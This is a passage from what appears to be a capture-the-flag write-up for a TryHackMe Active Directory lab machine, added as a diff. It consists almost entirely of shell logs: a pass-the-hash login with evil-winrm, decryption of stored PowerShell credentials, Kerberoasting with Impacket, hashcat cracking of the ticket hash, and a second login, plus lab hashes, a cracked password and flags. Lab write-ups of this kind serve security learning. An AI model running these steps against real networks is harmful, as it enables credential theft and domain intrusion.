@@ -612,3 +612,189 @@ root@rE3oN:~/thm/machines/medium/raz0rblack# crackmapexec smb 10.10.44.6 -u lvet
 SMB         10.10.44.6      445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
 SMB         10.10.44.6      445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
 ```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.44.6 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\lvetrova\Documents> dir
+*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..
+*Evil-WinRM* PS C:\Users\lvetrova> cd Desktop
+*Evil-WinRM* PS C:\Users\lvetrova\Desktop> dir
+*Evil-WinRM* PS C:\Users\lvetrova\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\lvetrova> ls
+
+
+    Directory: C:\Users\lvetrova
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:14 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:16 AM           1692 lvetrova.xml
+
+
+*Evil-WinRM* PS C:\Users\lvetrova> type lvetrova.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Your Flag is here =&gt;</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
+*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
+THM{694362e877adef0d85a92e6d17551fe4}
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.44.6 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile getuserspn_hash.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation
+-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
+HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 20:47:17.715160  <never>
+
+
+
+[-] CCache file is not found. Skipping...
+
+root@rE3oN:~/thm/machines/medium/raz0rblack# cat getuserspn_hash.txt
+$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$77b3200f15e1cb9f70fadf12c569aa95$dacc41a175c5bec980c91ac6113accad36f78df66f98a57a72df793a2a7a328f7584a4bc421a7e67a42222582ccbc8eed4fa969282b29cbc7e82f594a803f84ba69e1ca02ea9d951bba0936366b6fac4128c74e98ec11775b079b2f72f221697aef376de6bd30a079297a9eefd9732f48ed6d84a385ab6f410fc0e0090d22c0559cb891ae8c27697784e9ad6abae935701f70136f3af05cfd5b7d530f6dcf9f7ea3cf0219a8f6bf716f9839a7380189f6262c6bcaedcc14b85a767685d61be78be961645277eb2d2aa0ffeaf7ac89f20a7dd249aeeccf5e992d62bac04a3728f55711b56ed55c6f73fbba2a3f35a520119e7b540d46e774fe507f563c611bffaf6d8fff09608bfc8a3771971f51ec0e8bde787972fcaf48cdac3494d12b4abdda86f4bbf598cf0f3ada07aa553bc54dda1e0ee5ffb296aeef04ed28cfb556774c8bae5faa11b38ef0500f8df349f5a80659e688853a2b6167fb4235143cc732d58e03d52c644c35246f80104ba87a0986d323558d1cf15c939fa470a37091d1a7997fae9113a01d8819bb6af9414330549df910cebd5b8f2b4d83cc43a905ae6806ff21327c8b73f703158a158435e0f479944d83e641be0750fad796b4b4ef1ba3d4a375579806c34a449d265f0e609dfea37dabd47cc10efe414659179e97f3e410556f78bf28bc889161f84e8eb6b45f87a1845a02ee77003819e9616c402f757ae1ac1e8c7e8fbb501bbe57b3935b16f9b18339c8ea6adbb9e671d7bdf02d97aec92a632a7d1ad624a9eacf4943ba4ee66f7fa49970d6a004e17162e2970e87b143682bf49276f1e5a590826b85a1b17018c6305db15950d10a2e633d1589e7081f647f400c220533e9f8929ae91096d28b59726e19797af1e9987f913446b720ef497df94f5724b9ba0192ee556a3d042628fca10d6dc804378b4f06f3e3500e3338892acffa1d3e529f2a458ea734de86d9f03b204420ada4082932ca8c97665dac15ecbac83d4b9c7c8fc9716321a69a8379c47b0921fd279b3dd0ad932f56660cd22a3be9dd1a1b86214b9fed0880886550ff697c21e3a4a83f3f19bda5d4d1e6a78b751d494569a91dd260ee5aa3e50878aaa1121f0aee2c956ca50fd948d6ffd2b03d825c872e72493a6a3d0b33bf9e675aab057e4f48076ede0298c36ae827fb5c7cdc69cf6d36b1dcaba406feda2a2e8a38b3078d5002c4eb885d2fd6029c1c524a2150b9f01a955aa474bd78d1de580bea2df192aefcf798e8d0f41294fd9f699f10ee341cf068af0e3b3f7b79a1e1ce52e78e2b6b8bb9744201d3c5e40408b08b4263e6f3f220c08288df096aa98834945ef87700420e58ba72aeba7f34d83a5f837b30f5970c764a3e6bcf7c42ca66ab03e762dd25499826483d10d9a85e40aeabcac4104e18088
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# hashcat -m 13100 getuserspn_hash.txt /usr/share/wordlists/rockyou.txt | tee getuserspn-password.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$77b3200f15e1cb9f70fadf12c569aa95$dacc41a175c5bec980c91ac6113accad36f78df66f98a57a72df793a2a7a328f7584a4bc421a7e67a42222582ccbc8eed4fa969282b29cbc7e82f594a803f84ba69e1ca02ea9d951bba0936366b6fac4128c74e98ec11775b079b2f72f221697aef376de6bd30a079297a9eefd9732f48ed6d84a385ab6f410fc0e0090d22c0559cb891ae8c27697784e9ad6abae935701f70136f3af05cfd5b7d530f6dcf9f7ea3cf0219a8f6bf716f9839a7380189f6262c6bcaedcc14b85a767685d61be78be961645277eb2d2aa0ffeaf7ac89f20a7dd249aeeccf5e992d62bac04a3728f55711b56ed55c6f73fbba2a3f35a520119e7b540d46e774fe507f563c611bffaf6d8fff09608bfc8a3771971f51ec0e8bde787972fcaf48cdac3494d12b4abdda86f4bbf598cf0f3ada07aa553bc54dda1e0ee5ffb296aeef04ed28cfb556774c8bae5faa11b38ef0500f8df349f5a80659e688853a2b6167fb4235143cc732d58e03d52c644c35246f80104ba87a0986d323558d1cf15c939fa470a37091d1a7997fae9113a01d8819bb6af9414330549df910cebd5b8f2b4d83cc43a905ae6806ff21327c8b73f703158a158435e0f479944d83e641be0750fad796b4b4ef1ba3d4a375579806c34a449d265f0e609dfea37dabd47cc10efe414659179e97f3e410556f78bf28bc889161f84e8eb6b45f87a1845a02ee77003819e9616c402f757ae1ac1e8c7e8fbb501bbe57b3935b16f9b18339c8ea6adbb9e671d7bdf02d97aec92a632a7d1ad624a9eacf4943ba4ee66f7fa49970d6a004e17162e2970e87b143682bf49276f1e5a590826b85a1b17018c6305db15950d10a2e633d1589e7081f647f400c220533e9f8929ae91096d28b59726e19797af1e9987f913446b720ef497df94f5724b9ba0192ee556a3d042628fca10d6dc804378b4f06f3e3500e3338892acffa1d3e529f2a458ea734de86d9f03b204420ada4082932ca8c97665dac15ecbac83d4b9c7c8fc9716321a69a8379c47b0921fd279b3dd0ad932f56660cd22a3be9dd1a1b86214b9fed0880886550ff697c21e3a4a83f3f19bda5d4d1e6a78b751d494569a91dd260ee5aa3e50878aaa1121f0aee2c956ca50fd948d6ffd2b03d825c872e72493a6a3d0b33bf9e675aab057e4f48076ede0298c36ae827fb5c7cdc69cf6d36b1dcaba406feda2a2e8a38b3078d5002c4eb885d2fd6029c1c524a2150b9f01a955aa474bd78d1de580bea2df192aefcf798e8d0f41294fd9f699f10ee341cf068af0e3b3f7b79a1e1ce52e78e2b6b8bb9744201d3c5e40408b08b4263e6f3f220c08288df096aa98834945ef87700420e58ba72aeba7f34d83a5f837b30f5970c764a3e6bcf7c42ca66ab03e762dd25499826483d10d9a85e40aeabcac4104e18088:cyanide9amine5628
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/...e18088
+Time.Started.....: Wed Jul 13 19:54:30 2022 (5 secs)
+Time.Estimated...: Wed Jul 13 19:54:35 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1773.9 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 8867840/14344385 (61.82%)
+Rejected.........: 0/8867840 (0.00%)
+Restore.Point....: 8866816/14344385 (61.81%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: cybernickisgay -> cy4ever
+
+Started: Wed Jul 13 19:54:30 2022
+Stopped: Wed Jul 13 19:54:37 2022
+
+```
+
+```shell
+root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.44.6 -u xyan1d3 -p cyanide9amine5628
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> ls
+*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
+*Evil-WinRM* PS C:\Users\xyan1d3> ls
+
+
+    Directory: C:\Users\xyan1d3
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021   9:34 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml
+
+
+*Evil-WinRM* PS C:\Users\xyan1d3> type xyan1d3.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Nope your flag is not here</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2</SS>
+    </Props>
+  </Obj>
+</Objs>
+*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
+*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
+LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
+```
